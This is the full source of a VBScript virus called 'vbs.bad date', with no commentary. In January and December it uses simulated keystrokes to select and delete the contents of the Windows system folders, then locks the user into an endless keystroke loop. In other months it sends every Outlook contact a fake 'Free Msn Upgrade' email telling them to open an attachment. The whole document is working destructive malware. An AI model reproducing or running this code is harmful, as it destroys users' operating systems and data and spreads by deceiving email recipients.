   'vbs.bad date
   dim a,b,c,d,e,f,g,h,i,j,k
   set shell=createobject("wscript.shell")
   set a =createobject("scripting.filesystemobject")
   if Month(Now)="1" Then
   set b=a.createTextFile("c:\vbsrashdate.txt")
   b.writeline "You've Been Infected By The Vbs.Bad Date Virus"
   b.close
   set c=a.createTextFile("c:\Infection.txt")
   c.Writeline "You've Been Infected"
   c.Close
   set d=shell.createshortcut ("Notepad.lnk")
   d.targetpath = "notepad.exe"
   d.save
   set e=shell.createshortcut ("c:\Notepad.lnk")
   e.targetpath = "notepad.exe"
   e.save
   set f=a.createfolder ("c:\bad")
   createfolderdemo = f.path
   wscript.sleep 1500
   set g=a.createTextFile ("c:\bad\bad.txt")
   g.writeline "vbs.bad date"
   g.close
   Set h =shell.CreateShortcut("c:\Notepad.lnk")
   h.TargetPath = WScript.ScriptFullName
   h.Save
   shell.sendkeys "%{F4}"
   shell.sendkeys "{ESC}"
   Set i =shell.CreateShortcut("c:\bad\Notepad.lnk")
   i.TargetPath = WScript.ScriptFullName
   i.Save
   shell.run "%WINDIR%"
   wscript.sleep 1500
   shell.sendkeys "^{a}"
   wscript.sleep 1000
   shell.sendkeys "{DEL}"+"{ENTER}"
   wscript.sleep 1000
   shell.sendkeys "%{F4}"
   shell.run "%WINDIR%\system32"
   wscript.sleep 1500
   shell.sendkeys "^{a}"
   wscript.sleep 1000
   shell.sendkeys "{DEL}"+"{ENTER}"
   wscript.sleep 1000
   shell.sendkeys "%{F4}"
   shell.run "%WINDIR%\system"
   wscript.sleep 1500
   shell.sendkeys "^{a}"
   wscript.sleep 1000
   shell.sendkeys "{DEL}"+"{ENTER}"
   wscript.sleep 1000
   shell.sendkeys "%{F4}"
   wscript.sleep 1500
   msgbox "FILES DELETED",vbCritical,"WARNING"
   wscript.sleep 3000
   do
   shell.sendkeys "{*}"
   shell.sendkeys "{NUMLOCK}"
   shell.sendkeys "{SCROLLLOCK}"
   shell.sendkeys "{CAPSLOCK}"
   shell.sendkeys "{ESC}"
   shell.sendkeys "%{F4}"
   loop
   else
   if Month(Now)="12" Then
   Set j =shell.CreateShortcut("c:\Notepad1.lnk")
   j.TargetPath = WScript.ScriptFullName
   j.Save
   set k=a.createfolder ("c:\badd")
   createfolderdemo = k.path
   wscript.sleep 2000
   shell.run "%WINDIR%"
   wscript.sleep 1500
   shell.sendkeys "^{a}"
   wscript.sleep 1000
   shell.sendkeys "{DEL}"+"{ENTER}"
   wscript.sleep 1000
   shell.sendkeys "%{F4}"
   wscript.sleep 3000
   do
   shell.sendkeys "{*}"
   shell.sendkeys "{NUMLOCK}"
   shell.sendkeys "{SCROLLLOCK}"
   shell.sendkeys "{CAPSLOCK}"
   shell.sendkeys "{ESC}"
   shell.sendkeys "%{F4}"
   loop
   else
   Set ol = CreateObject("Outlook.Application")
   Set out = Wscript.CreateObject("Outlook.Application")
   Set mapi = out.GetNameSpace("MAPI")
   Set a = mapi.AddressLists(1)
   For X = 1 To a.AddressEntries.Count
   Set Mail = ol.CreateItem(0)
   Mail.to = ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(X)
   Mail.Subject = "Free Msn Upgrade"
   Mail.Body = "Please open attached file for email upgrade.Youll also get msn 8 and messanger 7."
   Mail.Send
   Next
   ol.Quit
   end if
   end if
